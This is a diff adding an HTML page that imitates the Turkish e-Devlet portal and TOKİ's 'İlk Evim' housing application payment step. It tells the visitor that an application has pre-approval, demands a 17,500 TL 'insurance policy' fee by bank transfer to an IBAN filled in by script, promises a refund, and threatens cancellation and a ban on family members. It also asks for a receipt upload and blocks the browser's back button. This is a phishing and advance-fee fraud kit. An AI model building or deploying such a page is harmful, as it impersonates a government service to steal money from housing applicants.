@@ -1,0 +1,1198 @@
+<!DOCTYPE html>
+<html lang="tr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
+    <meta http-equiv="Pragma" content="no-cache">
+    <meta http-equiv="Expires" content="0">
+    <title>TOKİ İlk Evim Başvurusu - Ödeme</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+            body {
+                font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+                background: #f5f5f5;
+                display: flex;
+                flex-direction: column;
+                min-height: 100vh;
+                padding-top: 130px;
+            }
+
+            /* iframe içinde görüntüleme düzeltmeleri */
+            body.in-iframe { min-height: auto; overflow-x: hidden; padding-top: 0; }
+            body.in-iframe .header { position: relative !important; width: 100% !important; }
+            body.in-iframe .header-top, body.in-iframe .header-search { max-width: 100%; }
+
+            .header {
+                background: #3b77ac;
+                color: white;
+                padding: 0;
+                position: fixed;
+                top: 0;
+                left: 0;
+                right: 0;
+                z-index: 9999;
+                width: 100%;
+            }
+
+            .header-top {
+                padding: 12px 20px;
+                display: flex;
+                align-items: center;
+                justify-content: space-between;
+            }
+
+            .header-search {
+                background: #3b77ac;
+                padding: 15px 20px;
+                display: flex;
+                flex-direction: column;
+                align-items: center;
+                justify-content: center;
+                gap: 15px;
+                box-shadow: 0 1px 3px rgba(0,0,0,0.1);
+            }
+
+            .header-logo {
+                display: flex;
+                align-items: center;
+                gap: 8px;
+            }
+
+            .logo-image {
+                height: 41px;
+                width: auto;
+                filter: brightness(0) invert(1);
+            }
+
+            .menu-btn {
+                background: none;
+                border: none;
+                color: white;
+                font-size: 18px;
+                cursor: pointer;
+                padding: 5px;
+            }
+
+            .search-box {
+                position: relative;
+                width: 300px;
+                max-width: 300px;
+            }
+
+            .search-input {
+                width: 100%;
+                padding: 10px 35px 10px 12px;
+                border: 1px solid #ddd;
+                border-radius: 8px;
+                font-size: 13px;
+                outline: none;
+                background: #f9f9f9;
+            }
+
+            .search-input:focus {
+                border-color: #4a7bc8;
+                background: white;
+            }
+
+            .search-btn {
+                position: absolute;
+                right: 8px;
+                top: 50%;
+                transform: translateY(-50%);
+                background: none;
+                border: none;
+                cursor: pointer;
+                width: 16px;
+                height: 16px;
+                background-image: url('./images/9349901.png');
+                background-size: contain;
+                background-repeat: no-repeat;
+                background-position: center;
+                filter: brightness(0) saturate(100%) invert(48%) sepia(79%) saturate(2476%) hue-rotate(206deg) brightness(118%) contrast(97%);
+            }
+
+            .user-info {
+                display: flex;
+                align-items: center;
+                justify-content: center;
+                width: 300px;
+                max-width: 300px;
+            }
+
+            .user-name {
+                background: white;
+                color: #333;
+                padding: 10px 20px;
+                border-radius: 8px;
+                font-size: 13px;
+                font-weight: 400;
+                display: flex;
+                align-items: center;
+                gap: 8px;
+                white-space: nowrap;
+                height: 41px;
+                box-sizing: border-box;
+                width: auto;
+                min-width: 120px;
+                border: 1px solid #ddd;
+            }
+
+            .user-name::before {
+                content: "";
+                background-image: url('./images/709699.png');
+                background-size: contain;
+                background-repeat: no-repeat;
+                background-position: center;
+                width: 12px;
+                height: 12px;
+                display: inline-block;
+                filter: brightness(0) saturate(100%) invert(35%) sepia(77%) saturate(1800%) hue-rotate(207deg) brightness(95%) contrast(90%);
+            }
+
+            .user-name { cursor: pointer; transition: all 0.2s; }
+            .user-name:hover { background: #f5f5f5; }
+            .user-info { position: relative; }
+            .user-dropdown { position: absolute; top: calc(100% + 8px); right: 0; background: white; border-radius: 8px; box-shadow: 0 4px 12px rgba(0,0,0,0.15); min-width: 220px; z-index: 10000; display: none; }
+            .user-dropdown.active { display: block; }
+            .user-dropdown ul { list-style: none; margin: 0; padding: 8px 0; }
+            .user-dropdown li { padding: 0; }
+            .user-dropdown li:first-child { padding: 12px 16px; background: #f8f9fa; color: #666; font-size: 12px; font-weight: 500; border-bottom: 1px solid #e9ecef; }
+            .user-dropdown a { display: block; padding: 10px 16px; color: #333; text-decoration: none; font-size: 13px; transition: background 0.2s; border-bottom: 1px solid #f0f0f0; }
+            .user-dropdown li:last-child a { border-bottom: none; }
+            .user-dropdown a:hover { background: #f8f9fa; color: #4a7bc8; }
+            .user-dropdown a.logout { color: #dc3545; }
+            .user-dropdown a.logout:hover { background: #fff5f5; }
+            .inbox-count { background: #dc3545; color: white; padding: 2px 6px; border-radius: 10px; font-size: 11px; margin-left: 5px; }
+
+            .dropdown-arrow {
+                width: 16px;
+                height: 16px;
+                background-image: url('./images/arrow.png');
+                background-size: contain;
+                background-repeat: no-repeat;
+                background-position: center;
+                margin-left: 1px;
+                opacity: 0.7;
+                display: inline-block;
+                filter: brightness(0) saturate(100%) invert(48%) sepia(79%) saturate(2476%) hue-rotate(206deg) brightness(118%) contrast(97%);
+            }
+            
+
+        .breadcrumb {
+            background: white;
+            padding: 10px 20px;
+            font-size: 13px;
+            color: #666;
+            border-bottom: 1px solid #eee;
+        }
+
+        .breadcrumb a {
+            color: #4a7bc8;
+            text-decoration: none;
+        }
+
+        .breadcrumb a:hover {
+            text-decoration: underline;
+        }
+
+        .home-icon {
+            width: 14px;
+            height: 14px;
+            vertical-align: middle;
+            margin-right: 5px;
+            filter: brightness(0) saturate(100%) invert(48%) sepia(79%) saturate(2476%) hue-rotate(206deg) brightness(118%) contrast(97%);
+        }
+
+        .main-content {
+            flex: 1;
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 20px;
+            width: 100%;
+        }
+
+        .service-header {
+            background: white;
+            border: 1px solid #ddd;
+            border-radius: 6px;
+            padding: 15px 15px 45px 15px;
+            margin-bottom: 20px;
+            position: relative;
+            box-shadow: 0 1px 3px rgba(0,0,0,0.1);
+            display: flex;
+            align-items: flex-start;
+            gap: 15px;
+        }
+
+        .service-logo {
+            width: 50px;
+            height: 50px;
+            overflow: hidden;
+            border-radius: 4px;
+            flex-shrink: 0;
+        }
+
+        .toki-logo-img {
+            width: 100%;
+            height: 100%;
+            object-fit: contain;
+        }
+
+        .service-info {
+            flex: 1;
+            margin-top: 0;
+            margin-left: 0;
+        }
+
+        .service-info h2 {
+            font-size: 14px;
+            color: #333;
+            margin-bottom: 5px;
+            line-height: 1.3;
+        }
+
+        .service-info p {
+            font-size: 11px;
+            color: #666;
+            margin: 0;
+            line-height: 1.3;
+        }
+
+        .header-social-actions {
+            position: absolute;
+            bottom: 15px;
+            right: 15px;
+            display: flex;
+            gap: 8px;
+        }
+
+        .header-social-btn {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            width: 28px;
+            height: 28px;
+            border-radius: 50%;
+            text-decoration: none;
+            font-size: 12px;
+            transition: all 0.2s;
+            filter: grayscale(100%);
+            background: #f8f9fa;
+            border: 1px solid #e9ecef;
+            cursor: pointer;
+            box-shadow: 0 1px 3px rgba(0,0,0,0.1);
+        }
+
+        .header-social-btn:hover {
+            filter: none;
+            transform: scale(1.1);
+            background: white;
+            box-shadow: 0 2px 6px rgba(0,0,0,0.15);
+        }
+
+        .header-social-btn:active {
+            transform: scale(0.95);
+        }
+
+        .social-icon-img {
+            width: 14px;
+            height: 14px;
+            transition: all 0.2s;
+        }
+
+        /* Emoji için özel stil */
+        .header-social-btn:first-child {
+            color: #ffc107;
+            background: #fff8e1;
+            border-color: #ffecb3;
+        }
+
+        .header-social-btn:first-child:hover {
+            background: #fff3c4;
+            border-color: #ffc107;
+        }
+
+        /* Success Notification Styles */
+        .success-notification {
+            background: #e8f5e8;
+            border: 1px solid #4caf50;
+            border-radius: 8px;
+            padding: 20px;
+            margin-bottom: 20px;
+            display: flex;
+            align-items: center;
+            gap: 15px;
+            box-shadow: 0 2px 8px rgba(76, 175, 80, 0.2);
+        }
+
+        .success-icon {
+            width: 50px;
+            height: 50px;
+            background: #4caf50;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            flex-shrink: 0;
+        }
+
+        .success-icon::before {
+            content: "✓";
+            color: white;
+            font-size: 24px;
+            font-weight: bold;
+        }
+
+        .success-content {
+            flex: 1;
+        }
+
+        .success-text {
+            color: #2e7d32;
+            font-size: 16px;
+            font-weight: 500;
+            line-height: 1.4;
+            margin: 0;
+        }
+
+        .tc-number {
+            font-weight: 600;
+            color: #1b5e20;
+        }
+
+        /* Insurance Policy Notification Styles */
+        .insurance-policy-notification {
+            background: #e3f2fd;
+            border: 1px solid #90caf9;
+            border-radius: 8px;
+            padding: 25px;
+            margin-bottom: 20px;
+            box-shadow: 0 2px 8px rgba(33, 150, 243, 0.2);
+        }
+
+        .insurance-header {
+            text-align: center;
+            margin-bottom: 20px;
+        }
+
+        .insurance-header h3 {
+            color: #1976d2;
+            font-size: 18px;
+            font-weight: 600;
+            margin: 0;
+        }
+
+        .insurance-content {
+            color: #333;
+            font-size: 14px;
+            line-height: 1.6;
+            margin-bottom: 15px;
+        }
+
+        .insurance-content p {
+            margin-bottom: 12px;
+        }
+
+        .insurance-content p:last-child {
+            margin-bottom: 0;
+        }
+
+        .insurance-highlight {
+            color: #1976d2;
+            font-weight: 600;
+        }
+
+        .insurance-fee {
+            text-align: center;
+            margin: 20px 0;
+            padding: 15px;
+            background: #f8f9fa;
+            border-radius: 6px;
+            border: 1px solid #dee2e6;
+        }
+
+        .insurance-fee-text {
+            color: #1976d2;
+            font-size: 16px;
+            font-weight: 600;
+            margin: 0;
+        }
+
+        .insurance-fee-amount {
+            color: #1976d2;
+            font-weight: 700;
+            font-size: 18px;
+        }
+
+        .insurance-warning {
+            background: #fff3cd;
+            border: 1px solid #ffeaa7;
+            border-radius: 6px;
+            padding: 15px;
+            margin-bottom: 15px;
+            color: #856404;
+            font-size: 13px;
+            line-height: 1.5;
+        }
+
+        .insurance-refund {
+            background: #d1ecf1;
+            border: 1px solid #bee5eb;
+            border-radius: 6px;
+            padding: 15px;
+            margin-bottom: 15px;
+            color: #0c5460;
+            font-size: 13px;
+            line-height: 1.5;
+        }
+
+        .insurance-alternative {
+            color: #6c757d;
+            font-size: 13px;
+            line-height: 1.5;
+            font-style: italic;
+        }
+
+        /* Mobile Responsive for Success Notification */
+        @media (max-width: 768px) {
+            .success-notification {
+                padding: 15px;
+                margin-bottom: 15px;
+                gap: 12px;
+            }
+
+            .success-icon {
+                width: 40px;
+                height: 40px;
+            }
+
+            .success-icon::before {
+                font-size: 20px;
+            }
+
+            .success-text {
+                font-size: 14px;
+            }
+
+            .insurance-policy-notification {
+                padding: 20px;
+            }
+
+            .insurance-header h3 {
+                font-size: 16px;
+            }
+
+            .insurance-content {
+                font-size: 13px;
+            }
+
+            .insurance-fee-text {
+                font-size: 14px;
+            }
+
+            .insurance-fee-amount {
+                font-size: 16px;
+            }
+        }
+
+        @media (max-width: 480px) {
+            .success-notification {
+                padding: 12px;
+                margin-bottom: 12px;
+                gap: 10px;
+            }
+
+            .success-icon {
+                width: 35px;
+                height: 35px;
+            }
+
+            .success-icon::before {
+                font-size: 18px;
+            }
+
+            .success-text {
+                font-size: 13px;
+            }
+
+            .insurance-policy-notification {
+                padding: 15px;
+            }
+
+            .insurance-header h3 {
+                font-size: 15px;
+            }
+
+            .insurance-content {
+                font-size: 12px;
+            }
+
+            .insurance-fee-text {
+                font-size: 13px;
+            }
+
+            .insurance-fee-amount {
+                font-size: 15px;
+            }
+        }
+
+        /* Bank Info Notification Styles */
+        .bank-info-notification {
+            background: #e3f2fd;
+            border: 1px solid #90caf9;
+            border-radius: 6px;
+            padding: 15px;
+            margin-bottom: 20px;
+            display: flex;
+            align-items: flex-start;
+            gap: 12px;
+            box-shadow: 0 1px 3px rgba(0,0,0,0.1);
+        }
+
+        .bank-info-icon {
+            background: #2196f3;
+            color: white;
+            width: 24px;
+            height: 24px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 14px;
+            font-weight: bold;
+            flex-shrink: 0;
+            margin-top: 2px;
+        }
+
+        .info-i {
+            font-style: normal;
+            font-weight: bold;
+        }
+
+        .bank-info-content {
+            flex: 1;
+        }
+
+        .bank-info-content p {
+            color: #1565c0;
+            font-size: 13px;
+            line-height: 1.5;
+            margin: 0;
+        }
+
+        /* Payment Form Styles */
+        .payment-form-section {
+            background: white;
+            border: 1px solid #ddd;
+            border-radius: 6px;
+            padding: 20px;
+            margin-bottom: 20px;
+            box-shadow: 0 1px 3px rgba(0,0,0,0.1);
+        }
+
+        .form-group {
+            margin-bottom: 25px;
+        }
+
+        .form-group:last-child {
+            margin-bottom: 0;
+        }
+
+        .form-label {
+            display: block;
+            font-size: 14px;
+            font-weight: 600;
+            color: #333;
+            margin-bottom: 8px;
+        }
+
+        .input-with-copy {
+            display: flex;
+            gap: 10px;
+            align-items: center;
+            margin-bottom: 8px;
+        }
+
+        .form-input {
+            flex: 1;
+            padding: 10px 12px;
+            border: 1px solid #ddd;
+            border-radius: 4px;
+            font-size: 13px;
+            color: #333;
+            background: #f9f9f9;
+        }
+
+        .form-input[readonly] {
+            background: #f9f9f9;
+            color: #666;
+        }
+
+        .amount-input {
+            font-size: 16px;
+            font-weight: bold;
+            color: #333 !important;
+            text-align: center;
+        }
+
+        .copy-btn {
+            background: #2196f3;
+            color: white;
+            border: none;
+            padding: 8px 16px;
+            border-radius: 4px;
+            font-size: 12px;
+            cursor: pointer;
+            transition: background-color 0.2s;
+            white-space: nowrap;
+        }
+
+        .copy-btn:hover {
+            background: #1976d2;
+        }
+
+        /* Copy Button Success Animation */
+        .copy-btn.success {
+            background: #4caf50 !important;
+            transform: scale(1.05);
+            box-shadow: 0 4px 12px rgba(76, 175, 80, 0.4);
+        }
+
+        .copy-btn.success::before {
+            content: "✓";
+            margin-right: 4px;
+        }
+
+        .form-help-text {
+            font-size: 11px;
+            color: #666;
+            line-height: 1.4;
+            margin-bottom: 5px;
+        }
+
+        .form-help-text:last-child {
+            margin-bottom: 0;
+        }
+
+        .orange-text {
+            color: #ff9800;
+        }
+
+        .red-text {
+            color: #f44336;
+            font-weight: 500;
+        }
+
+        /* Continue Button Section Styles */
+        .continue-button-section {
+            background: #ecf2f8;
+            padding: 20px;
+            text-align: center;
+            border-top: 1px solid #ddd;
+            margin-top: 20px;
+            border-radius: 0 0 6px 6px;
+        }
+
+        .continue-button {
+            background: #4a7bc8;
+            color: white;
+            border: none;
+            padding: 12px 30px;
+            border-radius: 20px;
+            font-size: 14px;
+            font-weight: 500;
+            cursor: pointer;
+            transition: all 0.2s;
+            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+        }
+
+        .continue-button:hover {
+            background: #3d6bb0;
+            transform: translateY(-1px);
+            box-shadow: 0 4px 8px rgba(0,0,0,0.15);
+        }
+
+        .continue-button:active {
+            transform: translateY(0);
+            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+        }
+
+        /* Popup Styles - e-Devlet Theme */
+        .popup-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(59, 119, 172, 0.8);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            z-index: 1000;
+            backdrop-filter: blur(2px);
+        }
+
+        .popup-content {
+            background: white;
+            border-radius: 12px;
+            padding: 30px;
+            max-width: 420px;
+            width: 90%;
+            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.3);
+            text-align: center;
+            border: 2px solid #e3f2fd;
+            position: relative;
+        }
+
+        .popup-content::before {
+            content: "";
+            position: absolute;
+            top: -2px;
+            left: -2px;
+            right: -2px;
+            bottom: -2px;
+            background: linear-gradient(135deg, #3b77ac, #4a7bc8);
+            border-radius: 12px;
+            z-index: -1;
+        }
+
+        .popup-message {
+            margin-bottom: 30px;
+            padding: 20px;
+            background: #f8fffe;
+            border-radius: 8px;
+            border-left: 4px solid #4a7bc8;
+        }
+
+        .popup-message p {
+            font-size: 15px;
+            color: #2c3e50;
+            line-height: 1.6;
+            margin: 0;
+            font-weight: 500;
+        }
+
+        .popup-buttons {
+            display: flex;
+            gap: 20px;
+            justify-content: center;
+        }
+
+        .popup-btn {
+            padding: 12px 30px;
+            border: none;
+            border-radius: 25px;
+            font-size: 14px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            min-width: 100px;
+            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.1);
+        }
+
+        .popup-btn-yes {
+            background: linear-gradient(135deg, #4a7bc8, #3b77ac);
+            color: white;
+        }
+
+        .popup-btn-yes:hover {
+            background: linear-gradient(135deg, #3d6bb0, #2d5a8a);
+            transform: translateY(-2px);
+            box-shadow: 0 4px 16px rgba(74, 123, 200, 0.3);
+        }
+
+        .popup-btn-no {
+            background: #f8f9fa;
+            color: #495057;
+            border: 2px solid #dee2e6;
+        }
+
+        .popup-btn-no:hover {
+            background: #e9ecef;
+            border-color: #adb5bd;
+            transform: translateY(-2px);
+            box-shadow: 0 4px 16px rgba(0, 0, 0, 0.1);
+        }
+
+        .footer {
+            background: #4b4e51;
+            color: white;
+            margin-top: 50px;
+            padding: 30px 0;
+        }
+
+        .footer-content {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 0 20px;
+        }
+
+        .footer-left {
+            text-align: left;
+        }
+
+        .footer-logo {
+            padding-top: 20px;
+            border-top: 1px solid #666;
+            display: flex;
+            align-items: center;
+            margin-bottom: 15px;
+        }
+
+        .tc-logo-img {
+            height: 40px;
+        }
+
+        .indir-logo-img {
+            height: 40px;
+            margin-left: 10px;
+        }
+
+        .footer-description {
+            margin-bottom: 15px;
+        }
+
+        .footer-description p {
+            text-align: justify;
+            font-size: 9px;
+            line-height: 1.4;
+            color: #ccc;
+        }
+
+        .footer-copyright {
+            padding-top: 15px;
+            border-top: 1px solid #666;
+        }
+
+        .footer-copyright p {
+            color: #999;
+            font-size: 9px;
+        }
+
+        /* Dekont Upload Styles */
+        .dekont-upload-section {
+            background: white;
+            border: 1px solid #ddd;
+            border-radius: 6px;
+            padding: 25px;
+            margin-bottom: 20px;
+            box-shadow: 0 1px 3px rgba(0,0,0,0.1);
+        }
+
+        .dekont-title {
+            font-size: 18px;
+            font-weight: 600;
+            color: #333;
+            margin-bottom: 20px;
+        }
+
+        .file-upload-container {
+            display: flex;
+            align-items: center;
+            gap: 15px;
+            margin-bottom: 20px;
+        }
+
+        .file-input-wrapper {
+            position: relative;
+            display: inline-block;
+        }
+
+        .file-input {
+            position: absolute;
+            opacity: 0;
+            width: 100%;
+            height: 100%;
+            cursor: pointer;
+        }
+
+        .file-select-btn {
+            background: #f8f9fa;
+            border: 1px solid #ddd;
+            border-radius: 6px;
+            padding: 12px 20px;
+            font-size: 14px;
+            color: #495057;
+            cursor: pointer;
+            transition: all 0.2s;
+            display: inline-block;
+        }
+
+        .file-select-btn:hover {
+            background: #e9ecef;
+            border-color: #adb5bd;
+        }
+
+        .file-name {
+            color: #6c757d;
+            font-size: 14px;
+            font-style: italic;
+        }
+
+        .file-name.has-file {
+            color: #28a745;
+            font-weight: 500;
+            font-style: normal;
+        }
+
+        .upload-info {
+            background: #e3f2fd;
+            border: 1px solid #90caf9;
+            border-radius: 6px;
+            padding: 15px;
+            margin-bottom: 20px;
+            font-size: 13px;
+            color: #1565c0;
+            line-height: 1.4;
+        }
+
+        .send-dekont-btn {
+            background: #4a7bc8;
+            color: white;
+            border: none;
+            border-radius: 6px;
+            padding: 15px 30px;
+            font-size: 16px;
+            font-weight: 500;
+            cursor: pointer;
+            transition: all 0.2s;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            margin: 0 auto;
+            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+        }
+
+        .send-dekont-btn:hover {
+            background: #3d6bb0;
+            transform: translateY(-1px);
+            box-shadow: 0 4px 8px rgba(0,0,0,0.15);
+        }
+
+        .send-dekont-btn:disabled {
+            background: #bdbdbd;
+            cursor: not-allowed;
+            transform: none;
+            box-shadow: none;
+        }
+
+        .send-dekont-btn::after {
+            content: "→";
+            font-size: 18px;
+            font-weight: bold;
+        }
+    </style>
+</head>
+<body>
+    <div class="header">
+        <div class="header-top">
+            <div class="header-logo">
+                <img src="./images/mylogo.png" alt="türkiye.gov.tr" class="logo-image">
+            </div>
+            <button class="menu-btn">☰</button>
+        </div>
+        <div class="header-search">
+            <div class="search-box">
+                <input type="text" class="search-input" placeholder="Nasıl yardım edebilirim?">
+                <button class="search-btn"></button>
+            </div>
+            <div class="user-info">
+                <div class="user-name" id="userNameToggle">Kullanıcı <span class="dropdown-arrow"></span></div>
+                <div class="user-dropdown" id="userDropdown"><ul><li>11111111110</li><li><a href="#">Benim Sayfam</a></li><li><a href="#">Favori Hizmetlerim</a></li><li><a href="#">Gelen Kutusu <span class="inbox-count">(37)</span></a></li><li><a href="#">İletişim Seçenekleri</a></li><li><a href="#">Güvenlik ve Ayarlar</a></li><li><a href="#">Şifremi Değiştir</a></li><li><a href="#" class="logout">Güvenli Çıkış</a></li></ul></div>
+            </div>
+        </div>
+    </div>
+
+
+    <div class="breadcrumb">
+        <img src="./images/home.png" alt="Ana Sayfa" class="home-icon"> <a href="#">Toplu Konut İdaresi Başkanlığı (...)</a> > İlk Evim Başvurusu > Ödeme
+    </div>
+
+    <div class="main-content">
+        <div class="service-header">
+            <div class="service-logo">
+                <img src="./images/tokyiim.webp" alt="TOKİ" class="toki-logo-img">
+            </div>
+            <div class="service-info">
+                <h2>Toplu Konut İdaresi Başkanlığı (TOKİ)</h2>
+                <p>İlk Evim Başvurusu</p>
+            </div>
+            <div class="header-social-actions">
+                <a href="#" class="header-social-btn" title="Favorilere Ekle">⭐</a>
+                <a href="#" class="header-social-btn comment-btn" title="Yorum Yap">
+                    <img src="./images/chat.png" alt="Yorum" class="social-icon-img">
+                </a>
+                <a href="#" class="header-social-btn share-btn" title="Paylaş">
+                    <img src="./images/sosial.png" alt="Paylaş" class="social-icon-img">
+                </a>
+            </div>
+        </div>
+
+        <!-- Başarı Bildirimi -->
+        <div class="success-notification">
+            <div class="success-icon"></div>
+            <div class="success-content">
+                <p class="success-text">
+                    <span class="tc-number" id="success-tc-number"></span> T.C. kimlik numaralı şahsa<br>
+                    ait başvuru ön onay almıştır.
+                </p>
+            </div>
+        </div>
+
+        <!-- Sigorta Poliçe Bildirimi -->
+        <div class="insurance-policy-notification">
+            <div class="insurance-header">
+                <h3>İşlemlerinize devam ediliyor.</h3>
+            </div>
+            
+            <div class="insurance-content">
+                <p>İşleminizin tamamlanabilmesi için Sigorta Poliçe ücreti ödenmesi gerekmektedir.</p>
+                
+                <p>Sigorta poliçe ödemesini havale yaptıktan sonra, ödeme dekontunuzu <span class="insurance-highlight">Dekont Gönder</span> butonundan sisteme yüklemeniz gerekmektedir.</p>
+            </div>
+            
+            <div class="insurance-fee">
+                <p class="insurance-fee-text">
+                    Hesaplanan Sigorta Poliçe ücreti : <span class="insurance-fee-amount">17.500 TL</span>
+                </p>
+            </div>
+            
+            <div class="insurance-warning">
+                Tahsilat ücretlerinin yatırılmaması durumunda, yarım kalan tamamlanmayan işlemlerinizde başvurunuz iptal edilerek tekrar başvuru yapma hakkınız son bulacaktır.
+            </div>
+            
+            <div class="insurance-refund">
+                Yatırdığınız tüm tutarlar banka hesabınıza işlem sonunda geri iade edilecektir.
+            </div>
+            
+            <div class="insurance-alternative">
+                Başka bir banka hesabından da ödeme yapabilirsiniz.
+            </div>
+        </div>
+
+        <!-- Banka Bilgilendirme Kutusu -->
+        <div class="bank-info-notification">
+            <div class="bank-info-icon">
+                <i class="info-i">i</i>
+            </div>
+            <div class="bank-info-content">
+                <p>Adınıza ait olmayan başka bir banka hesabından da ödeme yapabilirsiniz.</p>
+            </div>
+        </div>
+
+        <!-- Ödeme Formu -->
+        <div class="payment-form-section">
+            <!-- TOKİ Yetkili Adı -->
+            <div class="form-group">
+                <label class="form-label">*TOKİ Yetkili Adı</label>
+                <div class="input-with-copy">
+                    <input type="text" class="form-input" id="authority-name" value="Yükleniyor..." readonly>
+                    <button class="copy-btn" onclick="copyToClipboard(document.getElementById('authority-name').value, this)">Kopyala</button>
+                </div>
+                <div class="form-help-text">Ödeme dekontunuzun ekran resmini alarak sisteme yüklemeniz gerekmektedir.</div>
+            </div>
+
+            <!-- TOKİ İban No -->
+            <div class="form-group">
+                <label class="form-label">*TOKİ İban No</label>
+                <div class="input-with-copy">
+                    <input type="text" class="form-input" id="iban-number" value="Yükleniyor..." readonly>
+                    <button class="copy-btn" onclick="copyToClipboard(document.getElementById('iban-number').value.replace(/\s/g, ''), this)">Kopyala</button>
+                </div>
+                <div class="form-help-text">FAST/HAVALE ödemeleriniz anlık işleme alınmaktadır.</div>
+            </div>
+
+            <!-- Ödenecek Tutar -->
+            <div class="form-group">
+                <label class="form-label">*Ödenecek Tutar</label>
+                <div class="input-with-copy">
+                    <input type="text" class="form-input amount-input" id="payment-amount" value="Yükleniyor..." readonly>
+                    <button class="copy-btn" onclick="copyToClipboard(document.getElementById('payment-amount').value.replace(' TL', ''), this)">Kopyala</button>
+                </div>
+                <div class="form-help-text">Ödemeniz banka hesabınıza işlem sonunda anlık olarak iade edilmektedir.</div>
+                <div class="form-help-text red-text" style="font-weight: 600;">
+                    Başka bir tutarda ödeme yaparsanız başvurunuz iptal edilecektir.<br>
+                    Siz ve 3. aile üyelerinizden hiçbiri başvuru yapamayacaktır.
+                </div>
+            </div>
+
+            <!-- Gönderen Adı -->
+            <div class="form-group">
+                <label class="form-label">*Gönderen Adı</label>
+                <input type="text" id="sender-name" class="form-input" placeholder="Ödemeyi yapacak kişinin adı soyadı">
+                <div class="form-help-text orange-text">İşlemlerin tamamlanması için ödeme yapmanız gerekmektedir. İşlemlerin yarım kalması durumunda</div>
+                <div class="form-help-text red-text">Lütfen Havale/EFT açıklamasına aşağıdaki kodu girin.</div>
+                <div class="input-with-copy">
+                    <input type="text" class="form-input" id="payment-code" value="Yükleniyor..." readonly>
+                    <button class="copy-btn" onclick="copyToClipboard(document.getElementById('payment-code').value, this)">Kopyala</button>
+                </div>
+                <div class="form-help-text">Ödemenizin doğrulanması için yukarıdaki kodu Havale/EFT işlem açıklamasına girmeniz gerekmektedir.</div>
+                <div class="form-help-text">İşlemlerin tamamlanması için ödeme yapmanız gerekmektedir.</div>
+            </div>
+        </div>
+
+        <!-- Dekont Yükleme Bölümü -->
+        <div class="dekont-upload-section">
+            <h3 class="dekont-title">Ödeme Dekontu Yükleme</h3>
+            
+            <div class="file-upload-container">
+                <div class="file-input-wrapper">
+                    <input type="file" id="dekont-file" class="file-input" accept="image/*,.pdf" required>
+                    <button type="button" class="file-select-btn" onclick="document.getElementById('dekont-file').click()">Dosya Seç</button>
+                </div>
+                <span class="file-name" id="file-name">Dosya seçilmedi</span>
+            </div>
+            
+            <div class="upload-info">
+                <p>Lütfen ödeme dekontunuzun ekran resmini alarak sisteme yüklemeniz gerekmektedir.</p>
+            </div>
+            
+            <button id="send-dekont-btn" class="send-dekont-btn" disabled>Dekontu Gönder</button>
+        </div>
+
+        
+    </div>
+
+    <!-- Onay Popup -->
+    <div id="confirmation-popup" class="popup-overlay" style="display: none;">
+        <div class="popup-content">
+            <div class="popup-message">
+                <p>Bu başvuru tek seferlik bir işlemdir. Hayır seçim yapmanız durumunda başvurunuzun iptal gerekebilir.</p>
+            </div>
+            <div class="popup-buttons">
+                <button id="popup-yes" class="popup-btn popup-btn-yes">Evet</button>
+                <button id="popup-no" class="popup-btn popup-btn-no">Hayır</button>
+            </div>
+        </div>
+    </div>
+
+    <footer class="footer">
+        <div class="footer-content">
+            <div class="footer-left">
+                <div class="footer-logo">
+                    <img src="./images/tsc.png" alt="T.C. Cumhurbaşkanlığı Digital Dönüşüm Ofisi" class="tc-logo-img">
+                    <img src="./images/indir.png" alt="İndir" class="indir-logo-img">
+                </div>
+                <div class="footer-description">
+                    <p>e-Devlet Kapısı'nın kurulması ve yönetilmesi görevi T.C. Cumhurbaşkanlığı Digital Dönüşüm Ofisi Başkanlığı tarafından yürütülmekte olup, sistem altyapısının sağlanması Türksat A.Ş. tarafından yapılmaktadır.</p>
+                </div>
+                <div class="footer-copyright">
+                    <p>© 2025 Tüm Hakları Saklıdır. Gizlilik, Kullanım ve Telif Hakları bildiriminde belirtilen kurallar çerçevesinde hizmet sunulmaktadır.</p>
+                </div>
+            </div>
+        </div>
+    </footer>
+
+    <script>
+        history.pushState(null,null,location.href);window.onpopstate=function(){history.go(1)};
+        document.addEventListener('DOMContentLoaded',function(){const u=new URLSearchParams(window.location.search),tc=u.get('tc');if(tc){const e=document.querySelector('#userDropdown li:first-child');e&&(e.textContent=tc)}const t=document.getElementById('userNameToggle'),d=document.getElementById('userDropdown');if(t&&d){t.addEventListener('click',e=>{e.stopPropagation();d.classList.toggle('active')});document.addEventListener('click',e=>{!d.contains(e.target)&&!t.contains(e.target)&&d.classList.remove('active')});d.addEventListener('click',e=>e.stopPropagation())}});
+        if(window.self!==window.top){document.body.classList.add('in-iframe')}
+    </script>
+</body>
+</html>
